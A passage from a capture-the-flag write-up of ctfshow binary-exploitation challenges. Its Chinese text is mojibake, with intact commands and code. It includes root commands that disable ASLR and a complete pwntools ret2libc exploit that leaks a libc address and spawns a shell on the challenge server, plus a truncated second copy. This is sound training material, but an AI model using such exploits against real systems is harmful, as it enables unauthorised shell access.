</div><p>è™½ç„¶ <code>checksec</code> è¾“å‡ºä¸­æ²¡æœ‰ç›´æ¥çš„ ASLR å¼€å¯çŠ¶æ€ï¼Œä½†å¯ä»¥ç»“åˆç³»ç»Ÿå±‚é¢çš„è®¾ç½®ï¼ˆé€šè¿‡ <code>cat/proc/sys/kernel/randomize_va_space</code> æŸ¥çœ‹ï¼Œè¾“å‡º <code>0</code> è¡¨ç¤ºå…³é—­ ASLRï¼Œ<code>1</code> è¡¨ç¤ºéƒ¨åˆ†å¼€å¯ï¼Œ<code>2</code> è¡¨ç¤ºå®Œå…¨å¼€å¯ ï¼‰æ¥åˆ¤æ–­ç¨‹åºè¿è¡Œæ—¶çš„ ASLR æƒ…å†µã€‚</p>
<p>æ—¢ç„¶åœ°å€éšæœºåŒ–ä¿æŠ¤ï¼Œæˆ‘ä»¬å°±æŠŠå®ƒå…³æ‰ï¼ˆè®°å¾—ææƒrootï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/73.png"
	width="1340"
	height="774"
	srcset="/p/ctfshow-pwn-writeup/73_hu_b96db4a3f2e41298.png 480w, /p/ctfshow-pwn-writeup/73_hu_5ee4a282ddb01af4.png 1024w"
	loading="lazy"
	
		alt="flag"
	
	
		class="gallery-image" 
		data-flex-grow="173"
		data-flex-basis="415px"
	
></p>
<p>è¿™é‡Œæœ‰ä¸ªç‚¹å°±æ˜¯æˆ‘çš„flagæ˜¯ctfshow{0x400687_0x400560_0x6032a0_0x7ffff7fbf6b0}</p>
<p>ä½†ä¸çŸ¥ä¸ºå•¥å’Œå®˜æ–¹ä¸ä¸€æ ·flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}</p>
<p>ä½†æˆ‘çš„ç¨‹åºè¿è¡Œäº†ä¸‰æ¬¡ï¼ŒASRLä¹Ÿå…³äº†ï¼Œflagå‡ºæ¥çš„æ˜¯ä¸€æ ·çš„ï¼Œä»£è¡¨åœ°å€æ˜¯çœŸå®çš„ï¼Œflagæ²¡é”™çš„ã€‚åæ­£å¤§ä½“æ€è·¯æ˜¯æ­£ç¡®çš„ã€‚</p>
<blockquote class="alert alert-tip">
    <p>æ€»ä¹‹è®°ä½ï¼š/proc/sys/kernel/randomize_va_space</p></blockquote>
<h3 id="pwn_027">PWN_027
</h3><p>é¢˜ç›®ï¼šè®¾ç½®å¥½ ASLR ä¿æŠ¤å‚æ•°å€¼å³å¯è·å¾—flagã€‚<a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a>   <a class="link" href="PWN_027%5cPWN" >PWN</a></p>
<p>è¿™é¢˜ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œâ€If the result is 0 or 1, then you get the correct flag!â€œå°†ASLRä¿æŠ¤çš„æ•°å€¼æ”¹æˆ1æˆ–0å°±å¥½ã€‚ï¼ˆå¥—ä¸Šé¢˜çš„å…¬å¼ï¼‰</p>
<p>æ€ªæ€ªçš„ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/74.png"
	width="579"
	height="161"
	srcset="/p/ctfshow-pwn-writeup/74_hu_a5de9c2fc5414abb.png 480w, /p/ctfshow-pwn-writeup/74_hu_32320de88db9a594.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="359"
		data-flex-basis="863px"
	
></p>
<p>å®˜æ–¹flagæ˜¯ctfshow{0x400687_0x400560_0x603260}</p>
<p>æ¬¸æˆ‘å‘ç°&hellip;.0x603260çš„åé¢çš„6å˜æˆaäº†ï¼Œæœ‰ç‚¹æ‹›ç¬‘&hellip;åº”è¯¥æ˜¯Kaliç¯å¢ƒå’ŒUbuntuä¸åŒï¼Œæˆ‘å»ç½‘ä¸ŠæŸ¥äº†ä¸‹ï¼Œå‘ç°å¤§éƒ¨åˆ†PWNçš„WPéƒ½æ˜¯ç”¨Ubuntuè§£çš„ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/75.png"
	width="1203"
	height="595"
	srcset="/p/ctfshow-pwn-writeup/75_hu_d19abb44e81b7200.png 480w, /p/ctfshow-pwn-writeup/75_hu_da8dd3cdf4dd0a83.png 1024w"
	loading="lazy"
	
		alt="Ubuntu"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<p>è¿™é‡Œçš„flagå°±æ˜¯æ­£å¸¸çš„äº†ã€‚ä»ç°åœ¨å¼€å§‹æˆ‘å°†å½»åº•ä½¿ç”¨Ubuntuäº†ã€‚</p>
<h3 id="pwn_028">PWN_028
</h3><p>é¢˜ç›®ï¼šè®¾ç½®å¥½ ASLR ä¿æŠ¤å‚æ•°å€¼å³å¯è·å¾—flagï¼›<a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a>ã€ <a class="link" href="PWN_028%5cPWN" >PWN</a> ï¼ˆshowï¼‰</p>
<p><img src="/p/ctfshow-pwn-writeup/76.png"
	width="1081"
	height="520"
	srcset="/p/ctfshow-pwn-writeup/76_hu_3bb0ae8eea6f69ee.png 480w, /p/ctfshow-pwn-writeup/76_hu_bd87ab6076c16d6.png 1024w"
	loading="lazy"
	
		alt="é€åˆ†"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="498px"
	
></p>
<p>è¿™é¢˜é€åˆ†çš„ï¼ŒASLRç›´æ¥å…³çš„ï¼Œflagè¿˜æ˜¯åœ°å€æ‹¼å‡ºæ¥çš„ï¼Œé‚£flagå°±ä¸å˜å¾—å°±æ˜¯çœŸçš„äº†ã€‚ä¸ä¿¡å¯ä»¥å¤šè¿è¡Œå‡ æ¬¡ï¼Œä½ çœ‹flagä¼šå˜å—ï¼Ÿ</p>
<p>flag is :ctfshow{0x400687_0x400560}</p>
<h3 id="pwn_029">PWN_029
</h3><p>é¢˜ç›®ï¼šASLRå’ŒPIEå¼€å¯åï¼›<a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a>ã€ <a class="link" href="PWN_029%5cPWN" >PWN</a></p>
<p>è¯•ç€<a class="link" href="https://expl0rer.top/p/pwn-1/#pie%e5%92%8caslr"  target="_blank" rel="noopener"
    >ASLRå’ŒPIEä¿æŠ¤</a>å¼€å¯åï¼Œåœ°å€éƒ½ä¼šå°†éšæœºåŒ–ï¼Œè¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºç²’åº¦é—®é¢˜ï¼Œè™½ç„¶åœ°å€éƒ½è¢«éšæœºåŒ–äº†ï¼Œä½†æ˜¯è¢«éšæœºåŒ–çš„éƒ½ä»…ä»…æ˜¯æŸä¸ªå¯¹è±¡çš„èµ·å§‹åœ°å€ï¼Œè€Œåœ¨å…¶å†…éƒ¨è¿˜æ˜¯åŸæ¥çš„ç»“æ„ï¼Œä¹Ÿå°±æ˜¯ç›¸å¯¹åç§»æ˜¯ä¸ä¼šå˜åŒ–çš„ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/80.png"
	width="1045"
	height="210"
	srcset="/p/ctfshow-pwn-writeup/80_hu_eb0b3f7225c19224.png 480w, /p/ctfshow-pwn-writeup/80_hu_a72e66fce323c049.png 1024w"
	loading="lazy"
	
		alt="å·²ç»å¼€äº†PIEä¿æŠ¤"
	
	
		class="gallery-image" 
		data-flex-grow="497"
		data-flex-basis="1194px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sysctl -w kernel.randomize_va_space<span class="o">=</span><span class="m">2</span>  <span class="c1">#å®Œå…¨æ‰“å¼€ASLRä¿æŠ¤</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›´æ¥è¿è¡Œ&hellip;&hellip;</p>
<p>flagï¼ˆæœ‰ç‚¹é•¿ä½†æ˜¯å¯¹çš„&hellip;ï¼‰ï¼šctfshow{Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!}</p>
<p>è¿™é¢˜åªæ˜¯è®©ä½ äº†è§£ä¸‹ASLRå’ŒPIEä¿æŠ¤çš„ç‰¹ç‚¹ï¼Œflagä¸æ˜¯ç›®çš„ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/77.png"
	width="721"
	height="246"
	srcset="/p/ctfshow-pwn-writeup/77_hu_786e1172cf75d668.png 480w, /p/ctfshow-pwn-writeup/77_hu_6905a90a7330f54a.png 1024w"
	loading="lazy"
	
		alt="1"
	
	
		class="gallery-image" 
		data-flex-grow="293"
		data-flex-basis="703px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/78.png"
	width="939"
	height="306"
	srcset="/p/ctfshow-pwn-writeup/78_hu_e1703259702046b2.png 480w, /p/ctfshow-pwn-writeup/78_hu_f1640231a6bba9a3.png 1024w"
	loading="lazy"
	
		alt="2"
	
	
		class="gallery-image" 
		data-flex-grow="306"
		data-flex-basis="736px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/79.png"
	width="851"
	height="331"
	srcset="/p/ctfshow-pwn-writeup/79_hu_fec9c38c099bb243.png 480w, /p/ctfshow-pwn-writeup/79_hu_e3e1050063b8af4d.png 1024w"
	loading="lazy"
	
		alt="3"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<h3 id="pwn_030">PWN_030
</h3><p>é¢˜ç›®ï¼šå…³é—­PIEåï¼›ç¨‹åºçš„åŸºåœ°å€å›ºå®šï¼Œæ”»å‡»è€…å¯ä»¥æ›´å®¹æ˜“åœ°ç¡®å®šå†…å­˜ä¸­å‡½æ•°å’Œå˜é‡çš„ä½ç½®ã€‚ <a class="link" href="PWN_030" >PWN_030</a></p>
<p>checksecä¸€ä¸‹ï¼šæ²¡å¼€canaryå’ŒPIEï¼Œå¼€äº†NXä¸å¥½ç”¨Shellcodeã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/81.png"
	width="1219"
	height="630"
	srcset="/p/ctfshow-pwn-writeup/81_hu_890da67cf56d99a7.png 480w, /p/ctfshow-pwn-writeup/81_hu_931c9c7556ed7bb5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<p>IDAx32çœ‹ä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/82.png"
	width="690"
	height="215"
	srcset="/p/ctfshow-pwn-writeup/82_hu_598aa473ae731e26.png 480w, /p/ctfshow-pwn-writeup/82_hu_8f000c14f3a5fcb4.png 1024w"
	loading="lazy"
	
		alt="æ ˆæº¢å‡º"
	
	
		class="gallery-image" 
		data-flex-grow="320"
		data-flex-basis="770px"
	
></p>
<p>buf ï¼Œç”¨äºå­˜å‚¨ä»æ ‡å‡†è¾“å…¥è¯»å–çš„æ•°æ®ã€‚è¯¥å˜é‡åœ¨æ ˆä¸Šåˆ†é…ï¼Œç›¸å¯¹äºå‡½æ•°æ ˆå¸§æŒ‡é’ˆ ebp çš„åç§»ä¸º-0x88 ã€‚è°ƒç”¨ read å‡½æ•°ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ã€‚ read å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™é‡Œä½¿ç”¨ 0 è¡¨ç¤ºæ ‡å‡†è¾“å…¥ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å‘å­˜å‚¨æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œè¿™é‡Œæ˜¯ &amp;buf ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ï¼Œè¿™é‡Œæ˜¯ 0x100u ï¼Œå³ 256 å­—èŠ‚ï¼Œä½†è¿™charå®šä¹‰bufæ˜¯132å­—èŠ‚ï¼Œæ‰€ä»¥å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<p>å¹¶æ— æ‰¾åˆ°åé—¨/bin/shï¼Œé€šè¿‡ret2libcï¼Œé‚£ä»æ ˆæº¢å‡ºä¸‹æ‰‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºdebugï¼Œæ˜¾ç¤ºè¯¦ç»†è°ƒè¯•ä¿¡æ¯</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>       <span class="c1"># æŒ‡å®šç›®æ ‡ç¨‹åºä¸º32ä½æ¶æ„</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿æ¥è¿œç¨‹ç›®æ ‡æœåŠ¡å™¨ï¼Œè‹¥æœ¬åœ°è°ƒè¯•å¯åˆ‡æ¢ä¸ºprocess</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28121</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åŠ è½½ç›®æ ‡ç¨‹åºå’Œå¯¹åº”çš„libcåº“</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>                  <span class="c1"># åŠ è½½æ¼æ´ç¨‹åº</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/home/ctfshow/libc/32bit/libc-2.27.so&#39;</span><span class="p">)</span>  <span class="c1"># åŠ è½½å¯¹åº”çš„libcåº“</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–å…³é”®åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># ä»ç¨‹åºç¬¦å·è¡¨è·å–writeå‡½æ•°çš„PLTåœ°å€ï¼ˆç”¨äºè°ƒç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># ä»ç¨‹åºå…¨å±€åç§»è¡¨è·å–writeå‡½æ•°çš„GOTåœ°å€ï¼ˆå­˜å‚¨çœŸå®åœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">ctfshow</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span>        <span class="c1"># è·å–å­˜åœ¨æ ˆæº¢å‡ºçš„ctfshowå‡½æ•°åœ°å€ï¼ˆç”¨äºäºŒæ¬¡æº¢å‡ºï¼‰</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">140</span>  <span class="c1"># æº¢å‡ºåç§»ï¼šç¼“å†²åŒºå¤§å° + EBPé•¿åº¦ï¼Œé€šè¿‡è°ƒè¯•ç¡®å®š</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ ç¬¬ä¸€ä¸ªpayloadï¼šæ³„æ¼writeå‡½æ•°çš„çœŸå®åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>               <span class="c1"># å¡«å……ç¼“å†²åŒºç›´åˆ°è¦†ç›–è¿”å›åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">),</span>              <span class="c1"># è¦†ç›–è¿”å›åœ°å€ä¸ºwrite@pltï¼Œè°ƒç”¨writeå‡½æ•°</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">ctfshow</span><span class="p">),</span>                <span class="c1"># writeæ‰§è¡Œå®Œåè·³å›ctfshowå‡½æ•°ï¼Œä»¥ä¾¿å†æ¬¡æ¥æ”¶è¾“å…¥</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>                      <span class="c1"># writeå‡½æ•°ç¬¬1ä¸ªå‚æ•°ï¼šæ–‡ä»¶æè¿°ç¬¦1ï¼ˆæ ‡å‡†è¾“å‡ºï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">),</span>              <span class="c1"># writeå‡½æ•°ç¬¬2ä¸ªå‚æ•°ï¼šè¦è¯»å–çš„åœ°å€ï¼ˆwriteçš„GOTè¡¨é¡¹ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>                       <span class="c1"># writeå‡½æ•°ç¬¬3ä¸ªå‚æ•°ï¼šè¯»å–å­—èŠ‚æ•°ï¼ˆ32ä½åœ°å€å 4å­—èŠ‚ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘é€ç¬¬ä¸€ä¸ªpayloadï¼Œè§¦å‘writeå‡½æ•°æ³„æ¼åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># æ¥æ”¶æ³„æ¼çš„writeå‡½æ•°çœŸå®åœ°å€ï¼ˆ4å­—èŠ‚ï¼Œ32ä½ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;write address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">write_addr</span><span class="p">)</span>  <span class="c1"># æ‰“å°è·å–åˆ°çš„writeåœ°å€</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—libcåŸºåœ°å€åŠå…³é”®å‡½æ•°åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>  <span class="c1"># libcåŸºåœ°å€ = writeçœŸå®åœ°å€ - libcä¸­writeçš„åç§»</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>  <span class="c1"># systemå‡½æ•°åœ°å€ = åŸºåœ°å€ + systemåœ¨libcä¸­çš„åç§»</span>
</span></span><span class="line"><span class="cl"><span class="c1"># /bin/shå­—ç¬¦ä¸²åœ°å€ = åŸºåœ°å€ + /bin/shåœ¨libcä¸­çš„åç§»</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ‰“å°è®¡ç®—å¾—åˆ°çš„å…³é”®åœ°å€ï¼ˆè°ƒè¯•ç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc base: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;system address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">system_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;/bin/sh address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ ç¬¬äºŒä¸ªpayloadï¼šè°ƒç”¨system(&#34;/bin/sh&#34;)è·å–shell</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>               <span class="c1"># å†æ¬¡å¡«å……ç¼“å†²åŒºåˆ°è¿”å›åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span>            <span class="c1"># è¦†ç›–è¿”å›åœ°å€ä¸ºsystemå‡½æ•°åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span>             <span class="c1"># systemæ‰§è¡Œåçš„è¿”å›åœ°å€ï¼ˆéšæ„å¡«å……ï¼Œä¸å½±å“åŠŸèƒ½ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>              <span class="c1"># systemå‡½æ•°çš„å‚æ•°ï¼š/bin/shå­—ç¬¦ä¸²åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘é€ç¬¬äºŒä¸ªpayloadï¼Œè§¦å‘systemè°ƒç”¨</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œä¸è·å–åˆ°çš„shellè¿›è¡Œäº¤äº’</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ— å¤‡æ³¨ä»£ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ctfshow</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">140</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">ctfshow</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;write address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">write_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
